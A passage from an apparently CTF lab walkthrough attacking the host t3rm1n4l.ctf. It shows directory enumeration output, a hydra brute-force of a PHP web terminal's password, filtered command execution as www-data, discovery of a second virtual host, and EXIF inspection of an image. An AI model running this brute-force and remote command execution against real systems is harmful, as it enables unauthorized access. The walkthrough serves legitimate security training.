---- Entering directory: http://t3rm1n4l.ctf/manual/de/mod/ ----
+ http://t3rm1n4l.ctf/manual/de/mod/index.html (CODE:200|SIZE:22569)                                                                                                                                              
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/de/programs/ ----
+ http://t3rm1n4l.ctf/manual/de/programs/index.html (CODE:200|SIZE:6897)                                                                                                                                          
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/de/ssl/ ----
+ http://t3rm1n4l.ctf/manual/de/ssl/index.html (CODE:200|SIZE:5049)                                                                                                                                               
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/en/developer/ ----
+ http://t3rm1n4l.ctf/manual/en/developer/index.html (CODE:200|SIZE:5892)                                                                                                                                         
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/en/faq/ ----
+ http://t3rm1n4l.ctf/manual/en/faq/index.html (CODE:200|SIZE:3602)                                                                                                                                               
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/en/howto/ ----
+ http://t3rm1n4l.ctf/manual/en/howto/index.html (CODE:200|SIZE:6962)                                                                                                                                             
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/en/misc/ ----
+ http://t3rm1n4l.ctf/manual/en/misc/index.html (CODE:200|SIZE:5106)                                                                                                                                              
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/en/mod/ ----
+ http://t3rm1n4l.ctf/manual/en/mod/index.html (CODE:200|SIZE:22377)                                                                                                                                              
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/en/programs/ ----
+ http://t3rm1n4l.ctf/manual/en/programs/index.html (CODE:200|SIZE:6897)                                                                                                                                          
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/en/ssl/ ----
+ http://t3rm1n4l.ctf/manual/en/ssl/index.html (CODE:200|SIZE:5049)                                                                                                                                               
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/es/developer/ ----
+ http://t3rm1n4l.ctf/manual/es/developer/index.html (CODE:200|SIZE:5892)                                                                                                                                         
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/es/faq/ ----
+ http://t3rm1n4l.ctf/manual/es/faq/index.html (CODE:200|SIZE:3602)                                                                                                                                               
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/es/howto/ ----
+ http://t3rm1n4l.ctf/manual/es/howto/index.html (CODE:200|SIZE:6962)                                                                                                                                             
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/es/misc/ ----
+ http://t3rm1n4l.ctf/manual/es/misc/index.html (CODE:200|SIZE:5106)                                                                                                                                              
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/es/mod/ ----
+ http://t3rm1n4l.ctf/manual/es/mod/index.html (CODE:200|SIZE:22752)                                                                                                                                              
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/es/programs/ ----
+ http://t3rm1n4l.ctf/manual/es/programs/index.html (CODE:200|SIZE:6298)                                                                                                                                          
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/es/ssl/ ----
+ http://t3rm1n4l.ctf/manual/es/ssl/index.html (CODE:200|SIZE:5049)                                                                                                                                               
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/fr/developer/ ----
+ http://t3rm1n4l.ctf/manual/fr/developer/index.html (CODE:200|SIZE:5892)                                                                                                                                         
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/fr/faq/ ----
+ http://t3rm1n4l.ctf/manual/fr/faq/index.html (CODE:200|SIZE:3604)                                                                                                                                               
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/fr/howto/ ----
+ http://t3rm1n4l.ctf/manual/fr/howto/index.html (CODE:200|SIZE:7136)                                                                                                                                             
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/fr/misc/ ----
+ http://t3rm1n4l.ctf/manual/fr/misc/index.html (CODE:200|SIZE:5407)                                                                                                                                              
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/fr/mod/ ----
+ http://t3rm1n4l.ctf/manual/fr/mod/index.html (CODE:200|SIZE:24329)                                                                                                                                              
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/fr/programs/ ----
+ http://t3rm1n4l.ctf/manual/fr/programs/index.html (CODE:200|SIZE:7185)                                                                                                                                          
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/fr/ssl/ ----
+ http://t3rm1n4l.ctf/manual/fr/ssl/index.html (CODE:200|SIZE:5191)                                                                                                                                               
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/ja/developer/ ----
+ http://t3rm1n4l.ctf/manual/ja/developer/index.html (CODE:200|SIZE:5892)                                                                                                                                         
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/ja/faq/ ----
+ http://t3rm1n4l.ctf/manual/ja/faq/index.html (CODE:200|SIZE:3602)                                                                                                                                               
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/ja/howto/ ----
+ http://t3rm1n4l.ctf/manual/ja/howto/index.html (CODE:200|SIZE:7723)                                                                                                                                             
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/ja/misc/ ----
+ http://t3rm1n4l.ctf/manual/ja/misc/index.html (CODE:200|SIZE:5106)                                                                                                                                              
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/ja/mod/ ----
+ http://t3rm1n4l.ctf/manual/ja/mod/index.html (CODE:200|SIZE:23684)                                                                                                                                              
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/ja/programs/ ----
+ http://t3rm1n4l.ctf/manual/ja/programs/index.html (CODE:200|SIZE:6897)                                                                                                                                          
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/ja/ssl/ ----
+ http://t3rm1n4l.ctf/manual/ja/ssl/index.html (CODE:200|SIZE:5274)                                                                                                                                               
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/ko/developer/ ----
+ http://t3rm1n4l.ctf/manual/ko/developer/index.html (CODE:200|SIZE:5892)                                                                                                                                         
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/ko/faq/ ----
+ http://t3rm1n4l.ctf/manual/ko/faq/index.html (CODE:200|SIZE:3602)                                                                                                                                               
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/ko/howto/ ----
+ http://t3rm1n4l.ctf/manual/ko/howto/index.html (CODE:200|SIZE:6373)                                                                                                                                             
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/ko/misc/ ----
+ http://t3rm1n4l.ctf/manual/ko/misc/index.html (CODE:200|SIZE:5197)                                                                                                                                              
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/ko/mod/ ----
+ http://t3rm1n4l.ctf/manual/ko/mod/index.html (CODE:200|SIZE:21813)                                                                                                                                              
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/ko/programs/ ----
+ http://t3rm1n4l.ctf/manual/ko/programs/index.html (CODE:200|SIZE:5773)                                                                                                                                          
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/ko/ssl/ ----
+ http://t3rm1n4l.ctf/manual/ko/ssl/index.html (CODE:200|SIZE:5049)                                                                                                                                               
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/tr/developer/ ----
+ http://t3rm1n4l.ctf/manual/tr/developer/index.html (CODE:200|SIZE:5892)                                                                                                                                         
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/tr/faq/ ----
+ http://t3rm1n4l.ctf/manual/tr/faq/index.html (CODE:200|SIZE:3612)                                                                                                                                               
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/tr/howto/ ----
+ http://t3rm1n4l.ctf/manual/tr/howto/index.html (CODE:200|SIZE:6962)                                                                                                                                             
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/tr/misc/ ----
+ http://t3rm1n4l.ctf/manual/tr/misc/index.html (CODE:200|SIZE:5339)                                                                                                                                              
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/tr/mod/ ----
+ http://t3rm1n4l.ctf/manual/tr/mod/index.html (CODE:200|SIZE:22660)                                                                                                                                              
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/tr/programs/ ----
+ http://t3rm1n4l.ctf/manual/tr/programs/index.html (CODE:200|SIZE:7405)                                                                                                                                          
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/tr/ssl/ ----
+ http://t3rm1n4l.ctf/manual/tr/ssl/index.html (CODE:200|SIZE:5196)                                                                                                                                               
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/zh-cn/developer/ ----
+ http://t3rm1n4l.ctf/manual/zh-cn/developer/index.html (CODE:200|SIZE:5995)                                                                                                                                      
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/zh-cn/faq/ ----
+ http://t3rm1n4l.ctf/manual/zh-cn/faq/index.html (CODE:200|SIZE:3571)                                                                                                                                            
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/zh-cn/howto/ ----
+ http://t3rm1n4l.ctf/manual/zh-cn/howto/index.html (CODE:200|SIZE:6566)                                                                                                                                          
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/zh-cn/misc/ ----
+ http://t3rm1n4l.ctf/manual/zh-cn/misc/index.html (CODE:200|SIZE:4807)                                                                                                                                           
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/zh-cn/mod/ ----
+ http://t3rm1n4l.ctf/manual/zh-cn/mod/index.html (CODE:200|SIZE:22261)                                                                                                                                           
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/zh-cn/programs/ ----
+ http://t3rm1n4l.ctf/manual/zh-cn/programs/index.html (CODE:200|SIZE:6833)                                                                                                                                       
                                                                                                                                                                                                                  
---- Entering directory: http://t3rm1n4l.ctf/manual/zh-cn/ssl/ ----
+ http://t3rm1n4l.ctf/manual/zh-cn/ssl/index.html (CODE:200|SIZE:5042)                                                                                                                                            
                                                                                                                                                                                                                  
-----------------
END_TIME: Thu Apr 27 09:17:02 2017
DOWNLOADED: 341288 - FOUND: 75
root@kali:~# curl http://t3rm1n4l.ctf/js/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /js</title>
 </head>
 <body>
<h1>Index of /js</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="jquery-1.8.2.js">jquery-1.8.2.js</a></td><td align="right">2017-04-02 17:51  </td><td align="right"> 91K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="system.js">system.js</a></td><td align="right">2017-04-02 17:51  </td><td align="right">3.4K</td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
</body></html>
root@kali:~# curl http://t3rm1n4l.ctf/js/system.js
/*
*  PHP+JQuery Temrinal Emulator by Fluidbyte <http://www.fluidbyte.net>
*
*  This software is released as-is with no warranty and is complete free
*  for use, modification and redistribution
*/

$(function(){ terminal.init(); });

var terminal = {
    
    // Controller
    controller : 'term.php',
    
    // DOM Objects
    command : $('#command input'),
    screen : $('#terminal'),
    output : $('#terminal>#output'),
    
    // Command History
    command_history : [],
    command_counter : -1,
    history_counter : -1,
    
    init : function(){
        terminal.listener();
        // Start with authentication
        terminal.process_command();
    },
    
    listener : function(){
        terminal.command.focus().keydown(function(e){
            var code = (e.keyCode ? e.keyCode : e.which);
            var command = terminal.get_command();
            switch(code){
                // Enter key, process command
                case 13:
                    if(command=='clear'){
                        terminal.clear();
                    }else{
                        terminal.command_history[++terminal.command_counter] = command;
                        terminal.history_counter = terminal.command_counter;
                        terminal.process_command();   
                    }
                    terminal.command.val('').focus();
                    break;
                // Up arrow, reverse history
                case 38:
                    if(terminal.history_counter>=0){
                        $(this).val(terminal.command_history[terminal.history_counter--]);
                    }
                    break;
                // Down arrow, forward history
                case 40:
                    if (terminal.history_counter <= terminal.command_counter) {
                        $(this).val(terminal.command_history[++terminal.history_counter]);
                    }
                    break;
            }
        });
    },
    
    process_command : function(){
        var command = terminal.get_command();  
        $.post(terminal.controller,{command:command},function(data){
            switch(data){
                case '[CLEAR]':
                    terminal.clear();
                    break;
                case '[CLOSED]':
                    terminal.clear();
                    terminal.process_command();
                    break;
                case '[AUTHENTICATED]':
                    terminal.command_history = [];
                    terminal.command_counter = -1;
                    terminal.history_counter = -1;
                    terminal.clear();
                    break;
                case 'Enter Password:':
                    terminal.clear();
                    terminal.display_output('Authentication Required',data);
                    terminal.command.css({'color':'#333'});
                    break;
                default:
                    terminal.display_output(command,data);
            }
        });
    },
    
    get_command : function(){
        return terminal.command.val();
    },
    
    display_output : function(command,data){
        terminal.output.append('<pre class="command">'+command+'</pre><pre class="data">'+data+'</pre>');
        terminal.screen.scrollTop(terminal.output.height());    
    },
    
    clear : function(){
        terminal.output.html('');
        terminal.command.css({ 'color':'#fff' });
    }
    
};root@kali:~# 

```

the application used for term.php can be found at https://github.com/Fluidbyte/PHP-jQuery-Terminal-Emulator/blob/master/term.php
that requires credentials in order to execute commands, so we try to crack it with hydra
At first we get the string for a bad login
```bash

root@kali:~# curl http://t3rm1n4l.ctf/term.php
t3rm1n4l.ctf Passwordo Requireo:
root@kali:~#

```

Then we launch hydra attack using the proper post http syntax and the bad login string mentioned previously

```bash

root@kali:~# hydra -l "" -p "t3rm1n4l.ctf" t3rm1n4l.ctf http-post-form "/term.php:command=^PASS^:t3rm1n4l.ctf Passwordo Requireo"
Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-04-27 11:20:05
[DATA] max 1 task per 1 server, overall 64 tasks, 1 login try (l:1/p:1), ~0 tries per task
[DATA] attacking service http-post-form on port 80
[80][http-post-form] host: t3rm1n4l.ctf   password: t3rm1n4l.ctf
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2017-04-27 11:20:06
root@kali:~# 

```

It seems like that the terminal just accept as input command with the proper password, but doesn't execute any command

```bash

root@kali:~# curl -vv -X POST http://t3rm1n4l.ctf/term.php --data "command=t3rm1n4l.ctf"
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 192.168.1.167...
* Connected to t3rm1n4l.ctf (192.168.1.167) port 80 (#0)
> POST /term.php HTTP/1.1
> Host: t3rm1n4l.ctf
> User-Agent: curl/7.50.1
> Accept: */*
> Content-Length: 20
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 20 out of 20 bytes
< HTTP/1.1 200 OK
< Date: Thu, 27 Apr 2017 10:42:16 GMT
< Server: Apache
< Set-Cookie: PHPSESSID=1t4eh0o5fdau6u8h2ah1jud3t7; expires=Thu, 27-Apr-2017 10:42:26 GMT; Max-Age=10; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
< Pragma: no-cache
< Vary: Accept-Encoding
< Transfer-Encoding: chunked
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host t3rm1n4l.ctf left intact
AUTHENTICO!
root@kali:~# 

root@kali:~# curl -vv -X POST http://t3rm1n4l.ctf/term.php --data "command=ls"
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 192.168.1.167...
* Connected to t3rm1n4l.ctf (192.168.1.167) port 80 (#0)
> POST /term.php HTTP/1.1
> Host: t3rm1n4l.ctf
> User-Agent: curl/7.50.1
> Accept: */*
> Content-Length: 10
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 10 out of 10 bytes
< HTTP/1.1 200 OK
< Date: Thu, 27 Apr 2017 10:41:51 GMT
< Server: Apache
< Set-Cookie: PHPSESSID=ke9h2bafdgbot0umiv3lsfk0q5; expires=Thu, 27-Apr-2017 10:42:01 GMT; Max-Age=10; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
< Pragma: no-cache
< Vary: Accept-Encoding
< Transfer-Encoding: chunked
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host t3rm1n4l.ctf left intact
t3rm1n4l.ctf Passwordo Requireo:
root@kali:~# 

```

Opening the browser at http://t3rm1n4l.ctf we have the prompt, we try first a generic password, then the proper one and try to execute some commands

```bash

lynx http://t3rm1n4l.ctf

t3rm1n4l.ctf Passwordo Requireo:

pass

t3rm1n4l.ctf Passwordo Requireo:

t3rm1n4l.ctf/

t3rm1n4l.ctf Passwordo Requireo:

ls

t3rm1n4l.ctf Passwordo Requireo:

pwd

t3rm1n4l.ctf Passwordo Requireo:

t3rm1n4l.ctf

AUTHENTICO!

ls

ERROR: Megusto ere no no!

pwd

t3rm1n4l.ctf Passwordo Requireo:

t3rm1n4l.ctf

AUTHENTICO!

pwd

/usr/share/nginx/html

t3rm1n4l.ctf

ERROR: Megusto ere no no!

ls

t3rm1n4l.ctf Passwordo Requireo:

t3rm1n4l.ctf

AUTHENTICO!

dir

ERROR: Megusto ere no no!

t3rm1n4l.ctf

ERROR: Megusto ere no no!

id

t3rm1n4l.ctf Passwordo Requireo:

t3rm1n4l.ctf

AUTHENTICO!

id

uid=33(www-data) gid=33(www-data) groups=33(www-data)

t3rm1n4l.ctf

AUTHENTICO!

uname

t3rm1n4l.ctf Passwordo Requireo:

t3rm1n4l.ctf

AUTHENTICO!

uname

Linux

t3rm1n4l.ctf

AUTHENTICO!

ip

Usage: ip [ OPTIONS ] OBJECT { COMMAND | help }
       ip [ -force ] -batch filename
where  OBJECT := { link | addr | addrlabel | route | rule | neigh | ntable |
                   tunnel | tuntap | maddr | mroute | mrule | monitor | xfrm |
                   netns | l2tp | tcp_metrics | token | netconf }
       OPTIONS := { -V[ersion] | -s[tatistics] | -d[etails] | -r[esolve] |
                    -f[amily] { inet | inet6 | ipx | dnet | bridge | link } |
                    -4 | -6 | -I | -D | -B | -0 |
                    -l[oops] { maximum-addr-flush-attempts } |
                    -o[neline] | -t[imestamp] | -b[atch] [filename] |
                    -rc[vbuf] [size]}

t3rm1n4l.ctf

AUTHENTICO!

who

root     tty1         Apr 27 09:17

t3rm1n4l.ctf

AUTHENTICO!

grep

Usage: grep [OPTION]... PATTERN [FILE]...
Try 'grep --help' for more information.

```

The biggest part of commands are filtered out, and the only valid ones are pwd, id, who, ip, uname, grep

by doing grep with generic placeholder we get a list

```bash

t3rm1n4l.ctf

AUTHENTICO!

grep *

grep: BBBBBBBBBBB: Is a directory
grep: CCCCCCCCCCC: Is a directory
grep: M36u574.ctf: Is a directory
grep: XXXXXXXXXXX: Is a directory
grep: YYYYYYYYYYY: Is a directory
grep: ZZZZZZZZZZZ: Is a directory

```

where we have the name of another host M36u574.ctf
that we proceed to put into the file /etc/hosts

```bash

root@kali:~# nano /etc/hosts
root@kali:~# cat  /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

# CFT

192.168.1.167 M36u574.ctf

root@kali:~# 

```

The homepage each time gets loaded reload a different image

```bash

root@kali:~# curl http://M36u574.ctf | grep jpg
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   418    0   418    0     0  47141      0 --:--:-- --:--:-- --:--:-- 52250
<div><img src="images/megusta002.jpg" id="bg" alt="" /></div>
root@kali:~# curl http://M36u574.ctf | grep jpg
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   418    0   418    0     0  56235      0 --:--:-- --:--:-- --:--:-- 59714
<div><img src="images/megusta005.jpg" id="bg" alt="" /></div>
root@kali:~# curl http://M36u574.ctf | grep jpg
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   418    0   418    0     0  36528      0 --:--:-- --:--:-- --:--:-- 38000
<div><img src="images/megusta008.jpg" id="bg" alt="" /></div>
root@kali:~# curl http://M36u574.ctf | grep jpg
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   418    0   418    0     0   173k      0 --:--:-- --:--:-- --:--:--  204k
<div><img src="images/megusta002.jpg" id="bg" alt="" /></div>
root@kali:~# curl http://M36u574.ctf | grep jpg
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   419    0   419    0     0  61927      0 --:--:-- --:--:-- --:--:-- 69833
<div><img src="images/kingmegusta.jpg" id="bg" alt="" /></div>
root@kali:~# curl http://M36u574.ctf | grep jpg
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   418    0   418    0     0  37083      0 --:--:-- --:--:-- --:--:-- 38000
<div><img src="images/megusta001.jpg" id="bg" alt="" /></div>
root@kali:~# curl http://M36u574.ctf | grep jpg
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   418    0   418    0     0  45164      0 --:--:-- --:--:-- --:--:-- 46444
<div><img src="images/megusta007.jpg" id="bg" alt="" /></div>
root@kali:~# 

```

the most promising and interesting one results to be images/kingmegusta.jpg
so we download it and try to extract any content hidden in it

```bash

root@kali:~# wget http://M36u574.ctf/images/kingmegusta.jpg
--2017-04-27 11:45:19--  http://m36u574.ctf/images/kingmegusta.jpg
Risoluzione di m36u574.ctf (m36u574.ctf)... 192.168.1.167
Connessione a m36u574.ctf (m36u574.ctf)|192.168.1.167|:80... connesso.
Richiesta HTTP inviata, in attesa di risposta... 200 OK
Lunghezza: 497470 (486K) [image/jpeg]
Salvataggio in: "kingmegusta.jpg"

kingmegusta.jpg                                      100%[=====================================================================================================================>] 485,81K  --.-KB/s    in 0,03s   

2017-04-27 11:45:19 (17,9 MB/s) - "kingmegusta.jpg" salvato [497470/497470]

root@kali:~# 

```

Analyzing the image, it's possible to notice that an hidden comment contains the base64 hashes to crack

```bash

root@kali:~# apt-get install exiftool
Lettura elenco dei pacchetti... Fatto
Generazione albero delle dipendenze       
Lettura informazioni sullo stato... Fatto
Nota, viene selezionato "libimage-exiftool-perl" al posto di "exiftool"
The following additional packages will be installed:
  libarchive-zip-perl libmime-charset-perl libposix-strptime-perl libsombok3 libunicode-linebreak-perl
Pacchetti suggeriti:
  libencode-hanextra-perl libpod2-base-perl
I seguenti pacchetti NUOVI saranno installati:
  libarchive-zip-perl libimage-exiftool-perl libmime-charset-perl libposix-strptime-perl libsombok3 libunicode-linebreak-perl
0 aggiornati, 6 installati, 0 da rimuovere e 1766 non aggiornati.
È necessario scaricare 2.716 kB di archivi.
Dopo quest'operazione, verranno occupati 14,2 MB di spazio su disco.
Continuare? [S/n] s
Scaricamento di:1 http://kali.mirror.garr.it/mirrors/kali kali-rolling/main amd64 libarchive-zip-perl all 1.59-1 [95,5 kB]
Scaricamento di:2 http://kali.mirror.garr.it/mirrors/kali kali-rolling/main amd64 libimage-exiftool-perl all 10.40-1 [2.443 kB]
Scaricamento di:3 http://kali.mirror.garr.it/mirrors/kali kali-rolling/main amd64 libmime-charset-perl all 1.012-2 [35,2 kB]
Scaricamento di:4 http://kali.mirror.garr.it/mirrors/kali kali-rolling/main amd64 libposix-strptime-perl amd64 0.13-1+b2 [9.250 B]
Scaricamento di:5 http://kali.mirror.garr.it/mirrors/kali kali-rolling/main amd64 libsombok3 amd64 2.4.0-1+b2 [31,4 kB]
Scaricamento di:6 http://kali.mirror.garr.it/mirrors/kali kali-rolling/main amd64 libunicode-linebreak-perl amd64 0.0.20160702-1+b1 [102 kB]
Recuperati 2.716 kB in 1s (1.632 kB/s)             
Selezionato il pacchetto libarchive-zip-perl non precedentemente selezionato.
(Lettura del database... 421998 file e directory attualmente installati.)
Preparativi per estrarre .../0-libarchive-zip-perl_1.59-1_all.deb...
Estrazione di libarchive-zip-perl (1.59-1)...
Selezionato il pacchetto libimage-exiftool-perl non precedentemente selezionato.
Preparativi per estrarre .../1-libimage-exiftool-perl_10.40-1_all.deb...
Estrazione di libimage-exiftool-perl (10.40-1)...
Selezionato il pacchetto libmime-charset-perl non precedentemente selezionato.
Preparativi per estrarre .../2-libmime-charset-perl_1.012-2_all.deb...
Estrazione di libmime-charset-perl (1.012-2)...
Selezionato il pacchetto libposix-strptime-perl non precedentemente selezionato.
Preparativi per estrarre .../3-libposix-strptime-perl_0.13-1+b2_amd64.deb...
Estrazione di libposix-strptime-perl (0.13-1+b2)...
Selezionato il pacchetto libsombok3:amd64 non precedentemente selezionato.
Preparativi per estrarre .../4-libsombok3_2.4.0-1+b2_amd64.deb...
Estrazione di libsombok3:amd64 (2.4.0-1+b2)...
Selezionato il pacchetto libunicode-linebreak-perl non precedentemente selezionato.
Preparativi per estrarre .../5-libunicode-linebreak-perl_0.0.20160702-1+b1_amd64.deb...
Estrazione di libunicode-linebreak-perl (0.0.20160702-1+b1)...
Configurazione di libarchive-zip-perl (1.59-1)...
Configurazione di libmime-charset-perl (1.012-2)...
Configurazione di libimage-exiftool-perl (10.40-1)...
Elaborazione dei trigger per libc-bin (2.24-9)...
Elaborazione dei trigger per man-db (2.7.5-1)...
Configurazione di libsombok3:amd64 (2.4.0-1+b2)...
Configurazione di libposix-strptime-perl (0.13-1+b2)...
Configurazione di libunicode-linebreak-perl (0.0.20160702-1+b1)...
Elaborazione dei trigger per libc-bin (2.24-9)...
root@kali:~# ifconfig eth0 192.168.1.1
root@kali:~# ifconfig eth0 down
root@kali:~# ifconfig eth0 up
root@kali:~# exif
exif          exifautotran  exiftool      
root@kali:~# exif
exif          exifautotran  exiftool      
root@kali:~# exiftool kingmegusta.jpg 
ExifTool Version Number         : 10.40
File Name                       : kingmegusta.jpg
Directory                       : .
File Size                       : 486 kB
File Modification Date/Time     : 2017:04:04 08:43:18+02:00
File Access Date/Time           : 2017:04:27 11:45:56+02:00
File Inode Change Date/Time     : 2017:04:27 11:45:19+02:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Big-endian (Motorola, MM)
Orientation                     : Horizontal (normal)
X Resolution                    : 1000
Y Resolution                    : 1000
Resolution Unit                 : inches
Software                        : Adobe Photoshop CS5 Macintosh
Modify Date                     : 2012:03:27 22:28:18
Color Space                     : Uncalibrated
Exif Image Width                : 1280
Exif Image Height               : 1280
Compression                     : JPEG (old-style)
Thumbnail Offset                : 314
Thumbnail Length                : 7833
Current IPTC Digest             : cdcffa7da8c7be09057076aeaf05c34e
Coded Character Set             : UTF8
Application Record Version      : 0
IPTC Digest                     : cdcffa7da8c7be09057076aeaf05c34e
Displayed Units X               : inches
Displayed Units Y               : inches
Print Style                     : Centered
Print Position                  : 0 0
Print Scale                     : 1
Global Angle                    : 120
Global Altitude                 : 30
URL List                        : 
Slices Group Name               : MeGustaKing
Num Slices                      : 1
Pixel Aspect Ratio              : 1
Photoshop Thumbnail             : (Binary data 7833 bytes, use -b option to extract)
Has Real Merged Data            : Yes
Writer Name                     : Adobe Photoshop
Reader Name                     : Adobe Photoshop CS5
Photoshop Quality               : 12
Photoshop Format                : Standard
Progressive Scans               : 3 Scans
XMP Toolkit                     : Adobe XMP Core 5.0-c060 61.134777, 2010/02/12-17:32:00
Creator Tool                    : Adobe Photoshop CS5 Macintosh
Create Date                     : 2012:03:27 16:29:02+02:00
Metadata Date                   : 2012:03:27 22:28:18+02:00
Format                          : image/jpeg
Instance ID                     : xmp.iid:0280117407206811994CF9F468E3DAA9
Document ID                     : xmp.did:01801174072068119109B8CADD9DC675
Original Document ID            : xmp.did:01801174072068119109B8CADD9DC675
Color Mode                      : RGB
ICC Profile Name                : Adobe RGB (1998)
History Action                  : created, saved, converted, derived, saved
History Instance ID             : xmp.iid:01801174072068119109B8CADD9DC675, xmp.iid:0180117407206811994CF9F468E3DAA9, xmp.iid:0280117407206811994CF9F468E3DAA9
History When                    : 2012:03:27 16:29:02+02:00, 2012:03:27 22:28:18+02:00, 2012:03:27 22:28:18+02:00
